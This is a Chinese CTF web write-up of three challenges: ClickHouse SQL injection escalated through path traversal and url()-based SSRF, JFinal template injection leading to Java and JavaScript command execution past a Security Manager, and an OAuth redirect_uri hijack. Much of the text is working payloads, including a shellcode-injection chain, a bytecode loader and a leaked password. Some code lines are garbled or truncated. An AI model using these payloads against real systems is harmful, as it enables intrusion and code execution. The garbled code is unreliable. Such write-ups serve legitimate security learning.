MOC CTF MOC
前言
Games
double sqli & Solved & #SQL #ClickHouse
Unsecure Blog & Solved & #JFinal #表达式注入
Sp-Auth & Unsolved & #Spring #OAuth劫持 #CSRF and RCE ?
后记
前言
Web Wirteup 如下
Games
double sqli & Solved & #SQL #ClickHouse
首先进入题目，有种 sqli-labs 的既视感。在后面加上了单引号报错了。 
通过搜索，不难发现这个是 ClickHouse 的报错。简单浏览下官方文档，构造一个联合查询，帮助我们回显（报错太难看了。 
-1 union all select 'a';  
接着使用 user() 函数，简单看了下当前用户为 user_02  
然后测试了下几个函数，发现这个用户能干的事情太少了。通过目录扫描，发现存在一个路径 files  
这里之后@堆堆,告诉我这地方存在目录跨越，可以直接读文件了. 
/files9/  
接下来就是信息搜集了，不一会就传来了好消息，找到了一个数据库的初始文件路径为
files9/var/lib/clickhouse/access/xxxx.sql  
就这样我们便得到了一个有权限的用户 user_01 和其密码 e3b0c44298fc1c149afb 并且得到了flag所在的库名和表名. 
接下来通过阅读文档，发现 clickhouse 有两个很有意思的地方，这两个姿势合起来恰好可以形成一个需要授权的 SSRF 执行SQL
语句的功能。
HTTP Interface | ClickHouse Documentation 
url | ClickHouse Documentation 
url这个函数，可以帮助我们发起一个 http 请求。而 clickhouse 自带一个 http 的服务，用于执行 SQL 语句。
虽然文档中给的大多鉴权执行SQL语句大多都是 POST 请求。而 url 本身感觉只支持 GET 请求(未测试)。但是实际测试下来，完全
是可以只使用 GET 请求就完成授权操作以及 SQL 语句的执行 
见如下 payload
flag就到手了
Note
-1 union all select * from url('http99127.0.0.1:8123/?
user=user_01&password=e3b0c44298fc1c149afb&query=select * from ctf.flag', CSV, 'column1 String'); 
Unsecure Blog & Solved & #JFinal #表达式注入
题目展示如下
提取几个关键的信息
 jdk8u301
 flag的位置，这应该是在注册表中，可能需要文件读取或者是命令执行导出注册表
首先第一步弱口令 111111 进后台，没有什么需要说的。对后台功能进行测试之后，发现存在一个模板渲染的洞。对着官方文档
学学,构造如下包
POST /admin/blog/preview HTTP/1.1 
Host: 39.105.169.140:30000 
Content-Length: 53 
DNT: 1 
X-Requested-With: XMLHttpRequest 
Content-Type: application/x-99-form-urlencoded; charset=UTF-8 
Cookie: sessionId=4ccdd401322541cf94aaf6ec63aa41fb 
Connection: close 
blog.title=123&blog.id=2&blog.content=#set(x=1*1)9x) 
这里我们用到了两个语法
 #set() ，用于赋值
 9) 对象的引用 
一开始有一个知识盲区的地方，不知道怎么生成对象。比如 thymeleaf 模板注入可以使用 T() 来生成一个对象。但是这个一开始
确实没啥思路
在解决这个问题之前，其实还有一个地方需要解决，那就是这个 JFinal Enjoy 的内置黑名单，这个黑名单，对类以及方法名都
做了限制。
相关类如下，有想了解的师傅可以自己去看看这个类的静态代码块。
com.jfinal.template.expr.ast.MethodKit  
这里就给出方法名的黑名单
String[] ms = { 
            "getClass", "getDeclaringClass", "forName", "newInstance", "getClassLoader", 
            "invoke", 9 "getMethod", "getMethods", 9 "getField", "getFields", 
            "notify", "notifyAll", "wait", 
            "exit", "loadLibrary", "halt", 9 "load", 
            "stop", "suspend", "resume", 9 "setDaemon", "setPriority" 
            "removeForbiddenClass", 
            "removeForbiddenMethod" 
        }; 
之后想了个办法，通过调用一些类的静态方法来获取实例。比如这里我选择的
net.sf.ehcache.util.ClassLoaderUtil9createNewInstance 方法。可以看法到这个方法并没有在这个黑名单之中。 
那么获取实例这个地方我们就解决了。接下来的话自然想到转换成 js 代码执行。
#set(x=net.sf.ehcache.util.ClassLoaderUtil::createNewInstance("javax.script.ScriptEngineManager")) 
#set(e=x.getEngineByName("js")) 
#(e.eval(jscode)) 
在这里为了抄作业，利用 file99 协议可以列目录的特点，我优先写了个列目录以及获取文件内容的 poc (逃...
var inputStream = new java.net.URL("file:99C:/Users/ctf/jfinal-blog/jfinal-
blog/webapp").openConnection().getInputStream();   
var stringBuilder = new java.lang.StringBuilder();   
var reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));   
var line = null;   
while ((line = reader.readLine()) 9 null) {   
    stringBuilder.append(line);   
    stringBuilder.append("\n");   
}   
stringBuilder.toString(); 
也是看到很多有意思的东西，比如写 php 一句话，写 假flag , 其他模板注入 的ETC，也看到几个很有意思的思路
到了执行 js 其实也并不是一帆风顺了。比如可能会碰到
 命令执行不成功
 命令执行成功，但是却弹不回来shell
第一个问题是因为,这个 JFinal Blog 有一个 Security Manager  
Example
#set(x=
ParserConfig9getGlobalInstance()) 
#(x.setAutoTypeSupport(true)) 
#(x.addAccept("javax.script.ScriptEngineManager")) 
#set(a=com.alibaba.fastjson.JSON9parse('{"@type":"javax.script.ScriptEngineManager"}')) 
手动开启 FastJson 的 setAutoTypeSupport 的选项，然后通过调用 FastJson 来解析 JSON 来生成实例，属实比较牛逼了。
*似乎是出题人的预期解
#set(engine = 
ClassLoaderUtil9createNewInstance("javax.script.ScriptEngineManager",null,null))
#(engine.getEngineByName("javascript").eval("function getUnsafe(){var 
unsafeField=java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');unsafeField.setA
 unsafe=unsafeField.get(null);return unsafe}function getVirtualMachineClass(){var 
unsafe=getUnsafe();var 
b64ClassString='yv66vgAAADQAMgoABwAjCAAkCgAlACYF//////////8IACcHACgKAAsAKQcAKgoACQArBwAsAQAGPGluaXQ+A
 classBytes=java.util.Base64.getDecoder().decode(b64ClassString);var 
cls;try{cls=unsafe.defineClass('sun.tools.attach.WindowsVirtualMachine',classBytes,0,classBytes.lengt
{cls=java.lang.Class.forName('sun.tools.attach.WindowsVirtualMachine')}return cls}function 
getEnqueue(){var cls=getVirtualMachineClass();var declMethods=cls.getDeclaredMethods();for(var 
i=0;i<declMethods.length;if9)
{java.lang.System.out.println(declMethods[i].getName());if(declMethods[i].getName()i9'run'){var 
m=declMethods[i];var buf=
[0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,
 javaBuf=Java.to(buf,'byte[]');m.setAccessible(true);m.invoke(cls,javaBuf)}}}getEnqueue();")) 
com.alibaba.fastjson.parser.
net.sf.ehcache.util.
发现这里拦截了我们写 .dll 文件，防止我们命令执行。通过搜索，发现已经有师傅总结了几个 SM 绕过的姿势，这里贴一下链接
至于第二个问题嘛，是因为有 windows defender 似乎...
看完文章之后，想了想，应该可以写一个 js 绕过 security manager 的命令执行,见如下代码
这里也遇到了几个小坑
 如果想要java原生的 String[] ，需要通过反射来生成。单纯通过 ["123","123"] 这样生成代码，无法匹配上
java.lang.String[].class
 同理添加数组内容也最好使用反射来操作。
var clz = Java.type('java.lang.String[]').class;   
var rclz = Java.type('java.lang.ProcessBuilder.Redirect[]').class;   
var bclz = Java.type('boolean').class;   
var pclz = Java.type('java.lang.ProcessImpl').class;   
var cmd = java.lang.reflect.Array.newInstance(java.lang.String.class, 3);   
java.lang.reflect.Array.set(cmd, 0, 'cmd.exe');   
java.lang.reflect.Array.set(cmd, 1, '/c');   
java.lang.reflect.Array.set(cmd, 2, 'whoami');   
var m = pclz.getDeclaredMethod('start', clz, java.util.Map.class, java.lang.String.class, rclz, bclz);   
m.setAccessible(true);   
var inputStream = m.invoke(null, cmd, null, null, null, false).getInputStream();   
var stringBuilder = new java.lang.StringBuilder();   
var reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));   
var line = null;   
while ((line = reader.readLine()) 9 null) {   
    stringBuilder.append(line);   
    stringBuilder.append("\n");   
}   
stringBuilder.toString(); 
到这里相当于我们已经可以命令执行了，那么之后搜了下 Windows如何导出注册的表 得到以下命令 
eg export HKEY_CURRENT_USER 1.reg  
之后通过文件读取注册表即可获得 flag  
Sp-Auth & Unsolved & #Spring #OAuth劫持 #CSRF and RCE ?
由于这题没做出来，就不详细写Writeup了。只是和看过这个题的师傅们遥相交流一波。 
这道题感觉很多师傅和我一样卡在了第一步。就是这个 admin 用户究竟是干啥的。 
下面简述下第一步的过程。
首先先来了解下这里两个路由功能点
/oauth/authorize 这个路由使用来生成我们的授权码的。获取授权码之后，我们可以直接访问这个
http9939.105.116.246:30003/zwo/callback?code=2YbOS3aUhigWAysU8aFsHwP1 链接获取 cookie  
Tip
当然之前也写过 js 加载字节码的,也给玩的好的小伙伴私下交流过。
但是这里js执行字节码，这里也遇到几个小坑，
 消失的 sun.misc.BASE64Decoder 。难道jdk8u301没有了 sun.misc.BASE64Decoder() ?或者说不是用 oraclejdk
 需要把js代码进行一次urlencode，这里是用 try-catch 找到了问题所在
try {   
    function define(classBytes) {   
        var byteArray = Java.type('byte[]');   
        var int = Java.type('int');   
        var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', 
byteArray.class, int.class, int.class);   
        defineClassMethod.setAccessible(true);   
        var cc = 
defineClassMethod.invoke(java.lang.Thread.currentThread().getContextClassLoader(), classBytes, 0, 
classBytes.length);   
        return cc.getConstructor().newInstance();   
    }   
    var byteCode = '${byteCode}';   
    var decode = null;   
    try {   
        decode = java.util.Base64.getDecoder().decode(byteCode);   
    } catch (e) {   
        decode = new sun.misc.BASE64Decoder().decodeBuffer(byteCode);   
    }   
    var a = define(decode);   
    a   
} catch (e) {   
    e   
} 
所以我思路是: 
发过去的是一个生成授权码的链接，admin点了之后redirect到我们的机器上，我们拿到code，生成cookie。用这个Cookie登录
账号即可
这是之后测试的 Payload
http://39.105.116.246:30002/oauth/authorize?
client_id=62608e08adc29a8d6dbc9754e659f125&response_type=code&redirect_uri=http:/your-
ip:port%PI:EMAIL:30003/zwo/callback&scope=app 
但是似乎bot有点问题，在之后的测试中，我发了好几次链接，都没有收到来自bot的请求内容。
后记
Writeup写的十分仓促，所以对代码的分析不多，停在表面上。也欢迎各位师傅私下交流。